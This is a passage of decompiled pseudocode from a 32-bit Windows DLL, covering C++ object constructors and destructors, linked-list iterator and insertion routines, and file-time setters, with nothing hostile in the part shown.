    *this = &unk_100939A4;
    this[2] = &unk_100939AC;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_10010A0E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1009399C;
  return this;
}
// 1009399C: using guessed type int (__stdcall *off_1009399C)(char);

//----- (10010A0E) --------------------------------------------------------
_DWORD *__thiscall sub_10010A0E(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_1009398C;
    this[2] = &unk_10093994;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_1000CAAE(this, a2, 0);
  sub_10010A9E(this + 2, a2 != 0 ? (unsigned int)(a2 + 2) : 0, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093984;
  return this;
}
// 10093984: using guessed type int (__stdcall *off_10093984)(char);

//----- (10010A9E) --------------------------------------------------------
_DWORD *__thiscall sub_10010A9E(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_1009397C;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093974;
  return this;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);

//----- (10010AFF) --------------------------------------------------------
char *__thiscall sub_10010AFF(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10010985(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10010B21) --------------------------------------------------------
char *__thiscall sub_10010B21(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10010B65(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10010B43) --------------------------------------------------------
char *__thiscall sub_10010B43(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_10010B78(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10010B65) --------------------------------------------------------
void __thiscall sub_10010B65(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10027BFC(this + 3);
  sub_1001646C(v1);
}

//----- (10010B78) --------------------------------------------------------
void __thiscall sub_10010B78(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_10093974;
  sub_1001646C(v2);
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);

//----- (10010B8D) --------------------------------------------------------
int __thiscall sub_10010B8D(HANDLE *this)
{
  (*((void (__thiscall **)(HANDLE *))*this + 29))(this);
  return sub_10011E19(this);
}

//----- (10010B9D) --------------------------------------------------------
int __thiscall sub_10010B9D(HANDLE *this, const FILETIME *a2, int a3)
{
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  this[14] = (HANDLE)a2->dwLowDateTime;
  this[15] = (HANDLE)a2->dwHighDateTime;
  this[16] = (HANDLE)a3;
  return sub_1001209B(this, a2, a3);
}
// 10010B9D: using guessed type _DWORD pExceptionObject[2];

//----- (10010BE7) --------------------------------------------------------
int __thiscall sub_10010BE7(HANDLE *this, const FILETIME *a2, int a3)
{
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  this[17] = (HANDLE)a2->dwLowDateTime;
  this[18] = (HANDLE)a2->dwHighDateTime;
  this[19] = (HANDLE)a3;
  return sub_1001212C(this, a2, a3);
}
// 10010BE7: using guessed type _DWORD pExceptionObject[2];

//----- (10010C31) --------------------------------------------------------
int __thiscall sub_10010C31(_DWORD *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( (_BYTE)result )
  {
    result = (*(int (__thiscall **)(_DWORD *))(*this + 120))(this);
    if ( (_BYTE)result )
    {
      (*(void (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 92))(this, this + 14, this[16]);
      return (*(int (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 100))(this, this + 17, this[19]);
    }
  }
  return result;
}

//----- (10010C66) --------------------------------------------------------
BOOL __thiscall sub_10010C66(_DWORD *this)
{
  return (this[4] & 0x40000100) != 0;
}

//----- (10010C75) --------------------------------------------------------
int __thiscall sub_10010C75(void *this, char a2)
{
  sub_1001265E(this, a2);
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 116))(this);
}

//----- (10010C8F) --------------------------------------------------------
int __thiscall sub_10010C8F(HANDLE *this, _DWORD *a2)
{
  sub_1001269F(this, a2);
  return (*((int (__thiscall **)(HANDLE *))*this + 29))(this);
}

//----- (10010CA9) --------------------------------------------------------
int __thiscall sub_10010CA9(HANDLE *this)
{
  sub_100128CA(this);
  return (*((int (__thiscall **)(HANDLE *))*this + 29))(this);
}

//----- (10010CE9) --------------------------------------------------------
_DWORD *__stdcall sub_10010CE9(_DWORD *a1, int a2)
{
  sub_10010F0C(a1);
  *a1 = &off_10093A38;
  a1[4] = a2;
  return a1;
}
// 10093A38: using guessed type int (__thiscall *off_10093A38)(void *Block, char);

//----- (10010D1C) --------------------------------------------------------
_DWORD *__thiscall sub_10010D1C(_DWORD *Block, char a2)
{
  sub_10010D3B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010D3B) --------------------------------------------------------
void __thiscall sub_10010D3B(_DWORD *this)
{
  *this = &off_10093A38;
  sub_10010F43(this);
}
// 10093A38: using guessed type int (__thiscall *off_10093A38)(void *Block, char);

//----- (10010D5F) --------------------------------------------------------
int __stdcall sub_10010D5F(int *a1)
{
  int v1; // esi
  int v3[5]; // [esp+Ch] [ebp-20h] BYREF
  int v4; // [esp+28h] [ebp-4h]

  sub_10007816(v3);
  v4 = 0;
  sub_10010E29(a1, 0, (int)v3);
  if ( (*(int (__thiscall **)(int *))(v3[0] + 4))(v3) )
    v1 = *(_DWORD *)(*(int (__thiscall **)(int *, _DWORD))(v3[0] + 44))(v3, 0);
  else
    v1 = -1;
  v4 = -1;
  sub_10007890((int)v3);
  return v1;
}

//----- (10010DEC) --------------------------------------------------------
_DWORD *__stdcall sub_10010DEC(int *a1, _DWORD *a2)
{
  sub_10007816(a2);
  sub_10010E29(a1, 1, (int)a2);
  return a2;
}

//----- (10010E29) --------------------------------------------------------
void __thiscall sub_10010E29(int *this, char a2, int a3)
{
  int *v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // [esp+10h] [ebp-28h] BYREF
  volatile LONG *v8; // [esp+14h] [ebp-24h]
  int v9[2]; // [esp+18h] [ebp-20h] BYREF
  int v10; // [esp+20h] [ebp-18h] BYREF
  char v11; // [esp+27h] [ebp-11h]
  int v12; // [esp+34h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a3 + 52))(a3);
  sub_1000EEB8(this[4]);
  v10 = 0;
  (*(void (__thiscall **)(int *, int *))(*this + 12))(this, v9);
  v12 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v9[0] + 4))(v9[0]) )
  {
    v4 = (int *)(*(int (__thiscall **)(int))(*(_DWORD *)v9[0] + 12))(v9[0]);
    v8 = (volatile LONG *)v4[1];
    v7 = *v4;
    v5 = v7;
    InterlockedIncrement(v8);
    v11 = 0;
    LOBYTE(v12) = 2;
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5) == 1 )
      v11 = 1;
    v12 = 1;
    if ( v11 )
    {
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a3 + 36))(a3, &v10);
      if ( !a2 )
      {
        LOBYTE(v12) = 0;
        sub_100016CE(&v7);
        break;
      }
    }
    sub_1001134D(v6, v9[0]);
    ++v10;
    LOBYTE(v12) = 0;
    sub_100016CE(&v7);
  }
  v12 = -1;
  sub_10001707(v9);
}
// 10010EF3: variable 'v6' is possibly undefined
// 10010E29: using guessed type int var_18;

//----- (10010F0C) --------------------------------------------------------
_DWORD *__stdcall sub_10010F0C(_DWORD *a1)
{
  sub_1001149A(a1);
  *a1 = &off_10093A78;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10093A78: using guessed type int (__thiscall *off_10093A78)(void *Block, char);

//----- (10010F43) --------------------------------------------------------
void __thiscall sub_10010F43(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_10093A78;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[2];
    sub_100113A4(i);
  }
  sub_10011120(this);
}
// 10093A78: using guessed type int (__thiscall *off_10093A78)(void *Block, char);

//----- (10010F9A) --------------------------------------------------------
void *__thiscall sub_10010F9A(void *this, int a2)
{
  sub_1001143E(a2, (int)this);
  return this;
}

//----- (10010FAF) --------------------------------------------------------
void *__thiscall sub_10010FAF(void *this, int a2)
{
  sub_1001143E(a2, (int)this);
  return this;
}

//----- (10010FC4) --------------------------------------------------------
int __thiscall sub_10010FC4(_DWORD *this)
{
  return this[3];
}

//----- (10010FC8) --------------------------------------------------------
_DWORD *__thiscall sub_10010FC8(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10011500(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_100119A2(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001101E) --------------------------------------------------------
_DWORD *__thiscall sub_1001101E(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_100116F4(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10011A0F(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10011074) --------------------------------------------------------
_DWORD *__thiscall sub_10011074(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10011500(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_100119A2(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100110CA) --------------------------------------------------------
_DWORD *__thiscall sub_100110CA(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_100116F4(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10011A0F(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10011120) --------------------------------------------------------
void __thiscall sub_10011120(_DWORD *this)
{
  *this = &off_10093AB8;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093AB8: using guessed type int (__thiscall *off_10093AB8)(void *Block, char);

//----- (10011145) --------------------------------------------------------
int *__thiscall sub_10011145(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1001134D(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001119B: variable 'v5' is possibly undefined

//----- (100111AD) --------------------------------------------------------
int *__thiscall sub_100111AD(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100114CF(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10011203: variable 'v5' is possibly undefined

//----- (10011215) --------------------------------------------------------
void __thiscall sub_10011215(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10001707(v3);
}

//----- (10011250) --------------------------------------------------------
void __thiscall sub_10011250(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10001707(v2);
}

//----- (10011288) --------------------------------------------------------
int __thiscall sub_10011288(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011A4E(v4);
  return v2;
}

//----- (100112C4) --------------------------------------------------------
int __thiscall sub_100112C4(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10001707(v4);
  return v2;
}

//----- (10011300) --------------------------------------------------------
void __thiscall sub_10011300(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10001707(v1);
}

//----- (1001134D) --------------------------------------------------------
int __usercall sub_1001134D@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10011385) --------------------------------------------------------
_DWORD *__thiscall sub_10011385(_DWORD *Block, char a2)
{
  sub_10010F43(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100113A4) --------------------------------------------------------
void *__stdcall sub_100113A4(void *Block)
{
  sub_1001141E(Block);
  j__free(Block);
  return Block;
}

//----- (100113BF) --------------------------------------------------------
_DWORD *__thiscall sub_100113BF(_DWORD *Block, char a2)
{
  sub_10011120(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100113DE) --------------------------------------------------------
_DWORD *__thiscall sub_100113DE(_DWORD *Block, char a2)
{
  *Block = &off_10093AF0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093AF0: using guessed type int (__thiscall *off_10093AF0)(void *Block, char);

//----- (100113FE) --------------------------------------------------------
_DWORD *__thiscall sub_100113FE(_DWORD *Block, char a2)
{
  *Block = &off_10093B10;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093B10: using guessed type int (__thiscall *off_10093B10)(void *Block, char);

//----- (1001141E) --------------------------------------------------------
void __stdcall sub_1001141E(void *a1)
{
  sub_100016CE(a1);
}

//----- (1001143E) --------------------------------------------------------
void __usercall sub_1001143E(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_100114CF(v4, v5[0]);
  }
  v6 = -1;
  sub_10011A4E(v5);
}
// 10011477: variable 'v4' is possibly undefined

//----- (1001149A) --------------------------------------------------------
_DWORD *__stdcall sub_1001149A(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10093AB8;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093AB8: using guessed type int (__thiscall *off_10093AB8)(void *Block, char);

//----- (100114CF) --------------------------------------------------------
int __usercall sub_100114CF@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10011500) --------------------------------------------------------
_DWORD *__thiscall sub_10011500(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10093AF0;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10093B30;
  a2[3] = a3;
  return result;
}
// 10093AF0: using guessed type int (__thiscall *off_10093AF0)(void *Block, char);
// 10093B30: using guessed type int (__thiscall *off_10093B30)(void *Block, char);

//----- (1001153A) --------------------------------------------------------
void __thiscall sub_1001153A(_DWORD *this)
{
  *this = &off_10093B30;
  *this = &off_10093AF0;
}
// 10093AF0: using guessed type int (__thiscall *off_10093AF0)(void *Block, char);
// 10093B30: using guessed type int (__thiscall *off_10093B30)(void *Block, char);

//----- (1001155F) --------------------------------------------------------
BOOL __thiscall sub_1001155F(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10011568) --------------------------------------------------------
BOOL __thiscall sub_10011568(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10011571) --------------------------------------------------------
int __thiscall sub_10011571(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10011595) --------------------------------------------------------
int __thiscall sub_10011595(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (100115C2) --------------------------------------------------------
int __thiscall sub_100115C2(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (100115EF) --------------------------------------------------------
void *__thiscall sub_100115EF(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 8);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 8) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_100113A4(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10011665) --------------------------------------------------------
_DWORD *__thiscall sub_10011665(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  _DWORD *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-34h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-30h]
  int v11; // [esp-8h] [ebp-2Ch]
  volatile LONG *v12; // [esp-4h] [ebp-28h]
  int *v13; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_1001193B(Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100116F4) --------------------------------------------------------
_DWORD *__thiscall sub_100116F4(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10093B10;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10093B50;
  a2[3] = a3;
  return result;
}
// 10093B10: using guessed type int (__thiscall *off_10093B10)(void *Block, char);
// 10093B50: using guessed type int (__thiscall *off_10093B50)(void *Block, char);

//----- (1001172E) --------------------------------------------------------
void __thiscall sub_1001172E(_DWORD *this)
{
  *this = &off_10093B50;
  *this = &off_10093B10;
}
// 10093B10: using guessed type int (__thiscall *off_10093B10)(void *Block, char);
// 10093B50: using guessed type int (__thiscall *off_10093B50)(void *Block, char);

//----- (10011753) --------------------------------------------------------
BOOL __thiscall sub_10011753(_DWORD *this)
{
  return this[3] == 0;
}

//----- (1001175C) --------------------------------------------------------
BOOL __thiscall sub_1001175C(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10011765) --------------------------------------------------------
int __thiscall sub_10011765(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10011789) --------------------------------------------------------
int __thiscall sub_10011789(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (100117B6) --------------------------------------------------------
int __thiscall sub_100117B6(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (100117E3) --------------------------------------------------------
void *__thiscall sub_100117E3(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 8);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 8) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_100113A4(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10011859) --------------------------------------------------------
_DWORD *__thiscall sub_10011859(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  _DWORD *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-34h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-30h]
  int v11; // [esp-8h] [ebp-2Ch]
  volatile LONG *v12; // [esp-4h] [ebp-28h]
  int *v13; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_1001193B(Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100118E8) --------------------------------------------------------
